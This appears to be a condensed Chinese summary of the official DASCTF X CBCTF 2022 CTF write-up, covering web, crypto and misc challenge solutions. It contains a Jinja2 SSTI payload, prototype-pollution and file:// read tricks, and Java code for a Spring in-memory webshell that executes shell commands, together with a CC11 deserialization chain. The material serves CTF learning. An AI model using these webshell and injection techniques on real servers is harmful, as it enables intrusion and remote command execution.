---
title: DASCTF X CBCTF 2022 九月挑战赛官方 Write Up
contest: DASCTF+CBCTF
year: 2022
difficulty: medium
vuln_type: web_unknown
tags: [ssti-reverse, prototype-pollution, file-read-url, cc11-injectortocontroller, gopher, post, easykey]
attack_chain:
  - Sign_in: md5(score+salt) 时间戳爆破
  - Text Reverser: 字符串反转触发 Jinja2 反射
  - zzz_again: __proto__ 污染 Object.assign
  - a_proxy_server: URL.href 协议 file:///fl%61g
  - JavaMaster: file:// 读 /etc/hosts + Spring Boot 反序列化
  - InjectToController 内存马注册
  - gopher POST readObject
  - 写 cc11 字节码
  - TemplatesImpl + TiedMapEntry + LazyMap
key_payload: SSTI 反转 + JS 原型污染 + Spring 内存马
one_liner: DASCTF X CBCTF 2022 九月赛官方 WP，涵盖 SSTI/JS 原型污染/Spring 内存马。
lesson: "JavaMaster" 这类无出网 Spring 内存马是现代 CTF WEB 高频考点。
quality: high
---

DASCTF X CBCTF 2022 九月挑战赛官方 WP 合集（来源 ctfiot）。

**WEB 题目概览**：
- **Dnio3d** — 未给出解法
- **Text Reverser** — `output = '''{% print "".__class__.__bases__[0].__subclasses__()%}'''[::-1]`，反转的字符串触发 Jinja2 解析。
- **zzz_again** — JS 原型链污染。`changeUsername({"username": "__proto__"})` 注入原型；`Object.assign(order[user.username], product)` 触发 `__proto__.name = "href=file:///fl%61g"` 走 URL 协议 file 读 /flag。
- **a_proxy_server** — URL.href 属性传递 file:// 协议 + URL 编码 `%61` 绕 `^flag` 黑名单。
- **JavaMaster** — file 协议读内网 /etc/hosts + 网段探测 + Spring Boot 反序列化（无法出网弹 shell）。

**JavaMaster 关键代码**：
```java
public InjectToController() throws ... {
    WebApplicationContext context = (WebApplicationContext) RequestContextHolder
        .currentRequestAttributes().getAttribute(
            "org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
    RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(
        RequestMappingHandlerMapping.class);
    Method method2 = InjectToController.class.getMethod("test");
    PatternsRequestCondition url = new PatternsRequestCondition("/yang99");
    RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
    RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
    InjectToController injectToController = new InjectToController("aaa");
    mappingHandlerMapping.registerMapping(info, injectToController, method2);
}
```
内存马注册 /yang99 controller，cmd 走 `/bin/sh -c` 或 `cmd.exe /c` 执行命令。

**CC11 链构造**：TemplatesImpl._bytecodes/_name 反射设值 + InvokerTransformer("asdf...") + LazyMap.decorate + TiedMapEntry + HashSet + HashMap backingMap 反射 + key 替换。最后 gopher 协议 POST `192.168.7.23:8080/readObject` 注入。

**Crypto: easySignin** — `data = {"score": 1000000, "checkCode": md5("1000000DASxCBCTF_wElc03e"), "tm": int(time.time())}` POST `/check.php`。

**Misc: Sign_in** — 爆破 score=1e6。
**Misc: easy_keyboard** — `tshark -r keyboard.pcapng -T fields -e usbhid.data > usbdata.txt` 提 USB 键盘流量。
**Misc: mask** — `with open('what_is_it.piz','rb') as f: f1.write(f.read(700000).hex().upper()[::-1])` 反转 hex。
**Misc: ezflow** — pcap 流量 + CRC 校验。

**Pwn: appetizer / cyberprinter / bar / cgrasstring / ez_note** — 未给出解法。
**Reverse: landing / cbNET** — 未给出。
